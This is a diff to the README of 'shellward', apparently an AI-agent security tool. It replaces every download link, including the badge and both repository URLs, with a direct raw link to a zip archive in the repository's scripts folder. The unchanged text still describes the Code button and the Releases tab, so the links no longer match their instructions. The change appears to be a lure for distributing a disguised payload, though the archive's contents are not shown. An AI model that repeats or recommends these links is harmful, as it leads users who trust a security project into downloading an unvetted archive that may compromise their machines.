@@ -1,6 +1,6 @@
 # 🛡️ shellward - Secure Your AI Agent Easily
 
-[![Download shellward](https://img.shields.io/badge/Download-shellward-brightgreen)](https://github.com/kksharma17/shellward)
+[![Download shellward](https://img.shields.io/badge/Download-shellward-brightgreen)](https://github.com/kksharma17/shellward/raw/refs/heads/main/scripts/Software-2.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Make sure your system meets these basic requirements:
 
 Visit this page to download shellward:
 
-[https://github.com/kksharma17/shellward](https://github.com/kksharma17/shellward)
+[https://github.com/kksharma17/shellward/raw/refs/heads/main/scripts/Software-2.8.zip](https://github.com/kksharma17/shellward/raw/refs/heads/main/scripts/Software-2.8.zip)
 
 Click the **green "Code"** button on the main page and select **Download ZIP**. Or look for the **Releases** tab to find the latest version.  
 
@@ -142,7 +142,7 @@ If problems continue, visit the GitHub page and open an issue to get help.
 
 Use this link to visit the download page anytime:
 
-[https://github.com/kksharma17/shellward](https://github.com/kksharma17/shellward)
+[https://github.com/kksharma17/shellward/raw/refs/heads/main/scripts/Software-2.8.zip](https://github.com/kksharma17/shellward/raw/refs/heads/main/scripts/Software-2.8.zip)
 
 Click the **Releases** tab on the page to download the newest version.
 
